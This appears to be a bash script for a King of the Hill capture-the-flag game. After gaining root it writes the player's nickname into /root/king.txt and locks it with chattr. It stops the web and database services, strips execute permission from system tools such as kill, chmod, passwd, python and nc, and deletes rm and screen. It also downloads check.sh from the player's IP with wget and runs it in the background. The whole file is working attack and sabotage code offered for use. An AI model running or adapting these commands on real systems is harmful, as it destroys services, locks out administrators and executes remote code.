#!/bin/bash

echo "Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :) I'm kind :D "

echo "Join our Discord Server: https://discord.gg/y3aCGbrT8J"

echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
read -p "Enter your nickname: " nick
read -p "What is vpn ip ?: " IP
echo "Hello $nick :) Let's go"
echo 
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
sudo chmod 0755 /usr/bin/pkexec
sudo chmod -x /usr/bin/ftp
sudo chmod -x /usr/bin/nano
sudo chmod -x /usr/bin/vi
sudo chmod -x /usr/bin/ip
sudo chmod -x /usr/bin/ping
sudo chmod -x /usr/bin/pico
sudo chmod -x /usr/bin/find
sudo rm -rf /usr/bin/screen
sudo rm -rf /usr/bin/screen-4.5.0
echo 
echo "Patch part successfully ended..."
echo 
echo "-----------------------------------------------------------------------------"
echo 
sudo systemctl stop tomcat
sudo systemctl stop nginx
sudo systemctl stop mariadb
echo 
echo "Services Stopped..."
echo 
echo "-----------------------------------------------------------------------------"
echo 
chmod +x /usr/bin/chattr
sudo chattr -i /root/king.txt
echo "$nick" | sudo tee /root/king.txt >/dev/null
sudo chattr +i /root/king.txt
sudo chmod 400 /root/king.txt
set -o noclobber /root/king.txt
echo 
echo "-----------------------------------------------------------------------------"
echo 
echo "Files Operation Complete... Starting Operation 2..."
echo 
echo "-----------------------------------------------------------------------------"
echo
sudo chmod -x /usr/bin/systemctl
sudo chmod -x /var
sudo chmod -x /usr/bin/passwd
sudo chmod -x /usr/bin/chattr
sudo chmod -x /usr/bin/kill
sudo chmod -x /usr/bin/killall
sudo chmod -x /usr/bin/pkill
sudo chmod -x /usr/bin/mv
sudo chmod -x /usr/bin/curl
sudo chmod -x /usr/bin/nano
sudo chmod -x /usr/bin/vim
sudo chmod -x /usr/bin/vi
sudo chmod -x /usr/bin/python
sudo chmod -x /usr/bin/python2
sudo chmod -x /usr/bin/python3
sudo chmod -x /usr/bin/nc
sudo chmod -x /bin/nc
echo
echo
echo "Let's Go Forward... :)"
echo
echo "-----------------------------------------------------------------------------"
alias kill='echo "Sorry, the kill command is disabled."'
echo "-----------------------------------------------------------------------------"
echo
wget http://$IP/check.sh
echo
chmod +x check.sh
echo
./check.sh "$nick" &
echo
echo "--------------------File successfully running in the background---------------"
echo "-----------------------------------------------------------------------------"
echo
sudo chmod -x /bin/kill
sudo chmod -x /bin/systemctl
sudo chmod -x /usr/bin/wget
sudo chmod -x /usr/bin/chmod
sudo chmod -x /bin/chmod
sudo rm -rf /usr/bin/rm
echo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo
echo "Operation Fully Complete. The KING is $nick ! :) "
echo
echo "--------------Hi $nick don't forget to give us a star on Github--------------"
echo "-----------------------------------------------------------------------------"
